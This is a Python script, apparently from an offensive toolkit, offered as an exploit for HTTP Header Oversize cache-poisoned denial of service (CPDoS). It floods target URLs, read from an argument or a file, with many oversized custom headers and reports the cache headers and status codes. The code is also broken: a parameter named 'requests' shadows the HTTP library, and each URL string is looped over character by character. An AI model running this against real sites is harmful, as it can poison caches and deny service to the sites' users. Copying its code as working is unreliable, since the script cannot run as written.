'''
HTTP Header Oversize (HHO)
An HTTP request header contains vital information for intermediate systems and web servers. 
This includes cache-related header fields or meta data on client supported media types, languages and encodings.
'''
import requests
import argparse
import os
import sys

def disable_ssl_warnings():
  
    import urllib3
    urllib3.disable_warnings()

def clear_terminal():
  
    os.system('cls' if os.name == 'nt' else 'clear')

def parse_args():
  
    parser = argparse.ArgumentParser(description="Exploit an HTTP Header Oversize (HHO) to Perform CPDOS")
    parser.add_argument('-u', '--url', help='URL to exploit Without HTTPS:// or HTTP://')
    parser.add_argument('-f', '--file', help='File containing URLs Without HTTPS:// or HTTP://')   
    parser.add_argument('-t', '--timeout', help='Maximum number of seconds to wait while requesting a web page (default: 10)', default=10, type=int)
    parser.add_argument('-r','--requests',help='The number of requests that will be sent to the server (default: 100)',default=100,type=int)
    return parser.parse_args()

def exploit(urls,timeout,requests):

    num = requests
    headers = {}

    for i in range(num):
        headers[f"X-Oversized-Header-{i}"] = "Big-Value-00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"

    for url in urls:
        response = requests.get(url, headers=headers,timeout=timeout)
        cacheStatus = response.headers.get("X-Cache")
        age = response.headers.get("Age")
        code = response.status_code
        print(f"URL: {url}, Cache-Status: {cacheStatus}, Age: {age}, Code: {code}")

def main():
  
    disable_ssl_warnings()
    clear_terminal()

    print("""
    
    #########################################################
    #                                                       #
    #          HTTP Header Oversize (HHO)                   # 
    #             Severity: High                            #
    #                                                       #
    #########################################################
    
    [$] Description:
    
    An HTTP request header contains vital information for intermediate systems and web servers. 
    This includes cache-related header fields or meta data on client supported media types, languages and encodings.
    https://cpdos.org/
    """)

    args = parse_args()

    if args.file:
        print("[#] Fetching URLs from Provided file...")
        
        with open(args.file, "r") as f:
            urls = [url.strip() for url in f.readlines() if url.strip()]
            print("\n[#] Fetched...")
            for url in urls:
                print(f"\n[#] Target: {url}")
                exploit(url, args.timeout,args.requests)

    elif args.url:
        print(f"[#] Target: {args.url}")
        exploit(args.url, args.timeout,args.requests)

if __name__ == "__main__":
    main()
